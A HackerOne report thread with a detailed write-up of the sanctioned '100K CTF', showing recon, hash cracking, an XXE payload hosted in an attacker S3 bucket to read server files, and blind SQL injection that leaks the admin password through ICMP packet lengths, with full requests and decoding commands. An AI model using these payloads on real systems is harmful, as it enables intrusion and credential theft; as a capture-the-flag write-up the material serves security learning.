title: HackerOne’s 100K CTF Writeup
vulnerability_information:
Greetings team
It has been a great challenge, thank you very much for the fun moments and also for the annoying ones :)

██████████

P.S. I will put my writeup in my next comment.

## Impact

---

activities.message:
# HackerOne's 100K CTF Writeup ## A new journey begins After reading the CTF rules on [h1-ctf][h1-ctf] we grab our challenge scope: > In scope: > *.ccc.h1ctf.com Basic DNS recon while inspecting the main page leads us to two new subdomains: ```bash ❯ crtsh ccc.h1ctf.com ccc.h1ctf.com centomila.ccc.h1ctf.com einhunderttausend.ccc.h1ctf.com ❯ dig ccc.h1ctf.com centomila.ccc.h1ctf.com einhunderttausend.ccc.h1ctf.com ccc.h1ctf.com. 229 IN A 18.216.97.43 centomila.ccc.h1ctf.com. 240 IN A 18.216.97.43 einhunderttausend.ccc.h1ctf.com. 300 IN A 18.216.97.43 ``` Where both subdomains `centomila,einhunderttausend` mean `one hundred thousand` on Italian and German language respectively, at first sight both subdomains points to the same web application, so they are likely just an Easter egg ?: Lets check the main app on `https://ccc.h1ctf.com/` then {F1329069} Here we can register one new account on `/register`, so we first register a test user with credentials: > Test user: > admin@h1ctf.com:pizza4me After logged in with our test user, we got redirected to `/u/9qes96` with `500 Internal Server Error` as HTTP response code and one critical warning pointing to some remote file not found. {F1329070} Deleting cookies and through `/login`, the login form requires as inputs: - user hash - email - password We tried to log in using `9qes96` as our user hash and were successfully logged into our session again. > Test user hash: 9qes96 > Test user cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572 With no more visible content when browsing the web application, we move on to content discovery with our authenticated cookies: ```bash ❯ ffuf -w /usr/share/wordlists/playground/ctf/common.txt -u https://ccc.h1ctf.com/FUZZ -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572' <..> .config [Status: 200, Size: 124, Words: 3, Lines: 1, Duration: 154ms] _config [Status: 200, Size: 124, Words: 3, Lines: 1, Duration: 149ms] images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 119ms] index.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 146ms] login [Status: 200, Size: 1967, Words: 405, Lines: 37, Duration: 129ms] register [Status: 200, Size: 1802, Words: 352, Lines: 35, Duration: 108ms] zipfiles [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 138ms] :: Progress: [4685/4685] :: Job [1/1] :: 241 req/sec :: Duration: [0:00:13] :: Errors: 0 :: ``` Also, there is a Twitter link to web design company [@DesignsCcc][@DesignsCcc] on the home page. Inspecting that twitter feed we got two interesting clues: - https://twitter.com/DesignsCcc/status/1398629597298806786 > We've just finished our first website! This project was great fun! > {F1329071} - https://twitter.com/DesignsCcc/status/1398981963625676802 > Does anyone know if in nginx you can link a directory to a proxy_pass? In the Twitter image we got an interesting path `/error_-_-_log.txt`, where we have found some URLs of XML files in s3 buckets. ```bash ❯ curl 'https://ccc.h1ctf.com/error_-_-_log.txt' File: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found File: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found File: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found File: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found File: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found% # inspecting objects <..> ❯ curl 'https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml' dWdnY2Y6Ly9sYmhnaC5vci9iVXQ1RldMRVVOMA== # Rickrolled T.T ❯ echo dWdnY2Y6Ly9sYmhnaC5vci9iVXQ1RldMRVVOMA== | base64 -d | rot13 https://youtu.be/oHg5SJYRHA0% # inspecting bucket perms ❯ s3scanner scan --dangerous --buckets-file ~/projects/h1ctf/buckets.txt INFO: Including dangerous checks. WARNING: This may change bucket ACL destructively h1-56qw4c | bucket_exists | AuthUsers: [], AllUsers: [] h1-y0c9ov | bucket_exists | AuthUsers: [], AllUsers: [ReadACP] h1-wfzfi4 | bucket_exists | AuthUsers: [], AllUsers: [] h1-cn9uhd | bucket_exists | AuthUsers: [], AllUsers: [] h1-6hin8w | bucket_exists | AuthUsers: [], AllUsers: [ReadACP] ``` Here we noticed that the hash of our `9qes96` account seems to be related to the s3 bucket name with the pattern` h1-`. However, my concerns about the s3 bucket pricing lead me to follow other paths. ## Packed for everyone Fuzzing zip files on `/zipfiles` leads us to one likely juicy file: ```bash ❯ ffuf -w /usr/share/wordlists/playground/ctf/common.txt -u https://ccc.h1ctf.com/zipfiles/FUZZ -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572' -e .zip users.zip [Status: 200, Size: 381, Words: 4, Lines: 2, Duration: 139ms] :: Progress: [9370/9370] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:27] :: Errors: 0 :: ``` And we got some nice hashes there ?: ```bash ❯ wget https://ccc.h1ctf.com/zipfiles/users.zip -q ❯ unzip users.zip ❯ cat users.txt user_01:195fbb57ffe7449796d23466085ce6d8 user_02:639bae9ac6b3e1a84cebb7b403297b79 user_03:910955a907e739b81ec8855763108a29 user_04:f9323f5b51fc23e30c10623bd38de6ff user_05:ed2b5c0139cec8ad2873829dc1117d50 user_06:62cc0b4ebb0b57b40778179234246c38 user_07:9c62ad1fc551d04b815c8573285b65b2 user_08:8bf8854bebe108183caeb845c7676ae4 user_09:8fc42c6ddf9966db3b09e84365034357 user_10:adc3d649dd387e0c441a0c10f6219c63 ``` After trying to use them as a cookie token with no luck, we managed to crack them using [search-that-hash][sth] and got a nice Easter egg: > Secret message: > "May you be well on your side of the screen." ## Unexpected trip Going back to fuzzing, trying to fuzz GET request parameters on `u/9qes96` gave us some interesting responses: ```bash ❯ ffuf -w /usr/share/wordlists/playground/ctf/burp-parameter-names.txt -u 'https://ccc.h1ctf.com/u/9qes96?FUZZ=foo' -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572' -mc all -fc 500 description [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 2161ms] script [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3100ms] scripts [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3097ms] noalert [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3087ms] txtDescription [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3163ms] subscription [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3081ms] alert [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3082ms] :: Progress: [2588/2588] :: Job [1/1] :: 14 req/sec :: Duration: [0:02:59] :: Errors: 0 :: ❯ curl 'https://ccc.h1ctf.com/u/9qes96?fooscriptbar=foo' -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572'

NOC WAF Tripped

% ``` There is a WAF that blocks our request if our request contains these keywords: - script - alert Here, after a few hours with no idea what to do, we try to search for similar projects in public GitHub repositories. And we found one juicy repository: > GitHub dork: "WAF Tripped" {F1329068} > repository: https://github.com/ccc-labs/pinger > project: Pinger > description: Pinger is a simple application for sending ping requests from a webserver and includes a simple API to do so. > user: ccc-labs > committers: ccc-labs, Adam We now have the source code for the Pinger project, which is probably owned by the same design company as our target web application. But it does not represent a direct exploitation route, maybe it will be useful for later ?: ## Such a bucket Here, with no other paths to go and after searching for ideas on the awesome [Hacker101 discord][h101discord], it was suggested to us that we need to take a closer look at the s3 bucket pricing. Sure! That route was doable and we already had a lot of pieces out of fit, so we first created an s3 bucket `h1-9qes96` through the [AWS Management Console][AWS] . > S3 bucket: > h1-9qes96 And since we already know that the target web application expects a file called `file.xml`, we can test some XXE vectors there. ```bash ❯ aws s3 ls 2021-06-05 17:34:09 h1-9qes96 ❯ cat files.xml %xxe; ]> ❯ aws s3 cp files.xml s3://h1-9qes96 --acl public-read upload: ./files.xml to s3://h1-9qes96/files.xml ``` We got one HTTPS interaction after navigating to `/u/9qes96` to activate the XML parser. So we have a XEE vulnerability there, we went on to exploit it using [xxeserv][xxeserv] with php filters `php://filter/read=convert.base64-encode/resource=` where we managed to exfiltrate interesting data in: - /etc/nginx/sites-available/default ```plaintext ## # You should look at the following URL's in order to grasp a solid understanding # of Nginx configuration files in order to fully unleash the power of Nginx. # https://www.nginx.com/resources/wiki/start/ # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/ # https://wiki.debian.org/Nginx/DirectoryStructure # # In most cases, administrators will remove this file from sites-enabled/ and # leave it as reference inside of sites-available where it will continue to be # updated by the nginx packaging team. # # This file will automatically load configuration files provided by other # applications, such as Drupal or Wordpress. These applications will be made # available underneath a path with that package name, such as /drupal8. # # Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples. ## # Default server configuration # #server { # listen 80 default_server; # listen [::]:80 default_server; # # root /var/www/html; # # # Add index.php to the list if you are using PHP # index index.html index.htm index.nginx-debian.html; # # server_name _; # # location / { # try_files $uri $uri/ =404; # } #} #server { # server_name ccc.h1ctf.com; # root /var/www/app/public; # index index.php; # location / { # try_files $uri $uri/ /index.php?$query_string; # } # location /2b5d2b11513d2c9b { # proxy_pass http://127.0.0.1:8888; # } # # location ~ \.php$ { # base64: invalid input ``` Where we found an internal web application was available through `/2b5d2b11513d2c9b`. ## Internal pokes In `/2b5d2b11513d2c9b` we got a login form for a web application called `Pinger`. The pieces started to fit together from here. {F1329067} We already have access to Pinger's source code, so let's take a close look at its source code on GitHub: The relevant pieces in the source code are: - https://github.com/ccc-labs/pinger/blob/main/index.php ```php //<..> if( $url == '/' ){ Controller\Pinger::home(); }elseif( $url == '/api/ping' ){ Controller\Pinger::ping(); }else{ Controller\Pinger::error404(); } ``` - https://github.com/ccc-labs/pinger/blob/main/\_pingercode\_/controllers/Pinger.php ```php public static function ping(){ if( isset($_GET["id"]) ){ //Has IP address talked to us before? If not create a log file if( !file_exists( '_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt' ) ){ file_put_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt',date("U")); //Try and send PING to host ID Ping::send($_GET["id"]); http_response_code(201); header('Content-Type: application/json'); echo json_encode(array( 'result' => 'If we find a matching ID we\'ll send a ping' )); exit(); }else{ //GET timestamp of last time IP requested a ping $last_sent = (int)file_get_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt'); //Make sure IP didn't make a request in the last 60 seconds if( $last_sent < ( date("U") - 60 ) ){ Ping::send($_GET["id"]); file_put_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt',date("U")); http_response_code(201); header('Content-Type: application/json'); echo json_encode(array( 'result' => 'If we find a matching ID we\'ll send a ping' )); exit(); }else{ http_response_code(400); header('Content-Type: application/json'); echo json_encode(array( 'error' => 'Too many requests from IP '.$_SERVER["REMOTE_ADDR"].', only one per minute', )); exit(); } } }else{ http_response_code(400); header('Content-Type: application/json'); echo json_encode(array( 'error' => 'Missing Query String Variable id', )); exit(); } } ``` - https://github.com/ccc-labs/pinger/blob/main/\_pingercode\_/models/Ping.php ```php class Ping { public static function send( $id ){ $sql = 'select * from host where id = '.$id.' LIMIT 1 '; $d = Db::connect()->prepare($sql); $d->execute(); //Confirm we've found a matching row in the database if( $d->rowCount() == 1 ){ $host = $d->fetch(); $ip = $host["ip"]; $packet_size = intval($host["packet_size"]); //make sure PING packet size between 1 and 65527 if( $packet_size > 0 && $packet_size < 65528 ) { //check IP is a valid IPv4 Address if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) { //SEND 4 PING PACKETS IN THE BACKGROUND shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.' > /dev/null &'); } } } } } ``` - https://github.com/ccc-labs/pinger/blob/main/db.sql ```sql CREATE TABLE `host` ( `id` int(11) NOT NULL, `ip` varchar(15) NOT NULL DEFAULT '', `packet_size` int(11) NOT NULL DEFAULT '1' ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `host` (`id`, `ip`, `packet_size`) VALUES (1, '8.8.8.8', 32), (2, '127.0.0.1', 32), (3, '8.8.4.4', 32); <..> CREATE TABLE `user` ( `id` int(11) NOT NULL, `username` varchar(250) NOT NULL, `password` varchar(250) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `user` (`id`, `username`, `password`) VALUES (1, 'admin', 'password'); ``` Here we have found a juicy API endpoint `/api/ping` vulnerable to Blind SQLi via the `id` parameter with possible exfiltration via ICMP. Validating the SQLi using Burp with Hackvector plugin to create our payload: ```html GET /2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'████████',32<@/urlencode> HTTP/1.1 Host: ccc.h1ctf.com Cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572 Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 Connection: close HTTP/1.1 201 Created Server: nginx/1.18.0 (Ubuntu) Date: Sun, 06 Jun 2021 15:20:55 GMT Content-Type: application/json Connection: close Content-Length: 55 {"result":"If we find a matching ID we'll send a ping"} ``` Where we successfully obtained an interaction with our ICMP listener in our private box: ```bash $ sudo tcpdump -ni ens4 icmp and icmp[icmptype]=icmp-echo tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens4, link-type EN10MB (Ethernet), capture size 262144 bytes 14:59:20.033481 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 1, length 40 14:59:21.034638 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 2, length 40 14:59:22.035788 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 3, length 40 14:59:23.036969 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 4, length 40 ^C 4 packets captured 4 packets received by filter 0 packets dropped by kernel ``` Now we need to exfiltrate the password of the user `admin` to gain access to the Pinger panel, inspecting the source code we found.: - `/api/ping` is rate-limited to one request per minute - We can exfiltrate numeric values via `$packet_size` values - `$packet_size` values can be retrieved via `length` values on the ICMP records where `$packet_size` = `length` - 8 - Table schema of `host` and `user` tables We start with exfil the password length of the user `admin`: ```bash # payload /2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'█████',length(password) from user<@/urlencode> # ping length received: 29 # password length: 29-8 -> 21 ``` Then we use Burp Intruder to send 21 requests using this configuration: > Payload: Numbers 1-21 > Maximum concurrent requests: 1 > Delay between request: 62000 milliseconds ```html GET /2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'█████',ascii(substring(password,§1§,1)) from user<@/urlencode> HTTP/1.1 Host: ccc.h1ctf.com Cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572 Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 Connection: close ``` After copying the ICMP records to an `icmpcap.txt` file, we can process it to get our exfiltrated data: ```bash ❯ cat icmpcap.txt | grep '18.216.97.43' | grep 'seq 1,' 19:22:55.242494 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 867, seq 1, length 93 19:23:57.291867 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 868, seq 1, length 108 19:24:59.262256 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 869, seq 1, length 63 19:26:01.279975 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 870, seq 1, length 65 19:27:03.286286 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 871, seq 1, length 102 19:28:05.309613 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 873, seq 1, length 57 19:29:07.226046 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 874, seq 1, length 80 19:30:09.214000 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 875, seq 1, length 80 19:31:11.311736 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 876, seq 1, length 82 19:32:13.188259 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 877, seq 1, length 44 19:33:15.236418 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 878, seq 1, length 95 19:34:17.155049 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 879, seq 1, length 50 19:35:19.184473 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 880, seq 1, length 81 19:36:21.176596 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 881, seq 1, length 87 19:37:23.175452 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 882, seq 1, length 106 19:38:25.198107 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 883, seq 1, length 105 19:39:27.140046 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 884, seq 1, length 83 19:40:29.193445 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 885, seq 1, length 108 19:41:31.187083 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 887, seq 1, length 89 19:42:33.102326 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 888, seq 1, length 111 19:43:35.281116 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 889, seq 1, length 81 ❯ cat icmpcap.txt | grep '18.216.97.43' | grep 'seq 1,' | awk '{print sprintf("%c",($NF-8))}' | paste -sd '' Ud79^1HHJ$W*IObaKdQgI ``` So we have now as credentials: > admin:Ud79^1HHJ$W*IObaKdQgI Trying to login to `/2b5d2b11513d2c9b/` using those credentials and then.. ███████ Success, we got access to the administration panel and we have the flag at our fingertips! > Flag: > █████ [h1-ctf]: https://hackerone.com/h1-ctf?type=team [@DesignsCcc]: https://twitter.com/DesignsCcc [sth]: https://github.com/HashPals/Search-That-Hash [h101discord]: https://www.hacker101.com/discord [AWS]: https://aws.amazon.com/console/ [xxeserv]: https://github.com/staaldraad/xxeserv
Hi @rykkard - Nice seeing you play this CTF!
Hey @nahamsec , I'm glad I participated as I am always learning new things from these challenges, a big virtual hug to everyone involved in creating the challenge!

Hey @rykkard  - Awesome job and love the detailed write-up! 

I have redacted and removed any references to the flag including some of your screenshots. If you chose to release your own write-up, please make sure to remove the flag from your post.
Thanks again and happy hacking!

You are all great, thanks for the bonus!
I am open to disclose this writeup, please redact for me these references that I forgot to retire (again!): `██████████` and `████████`
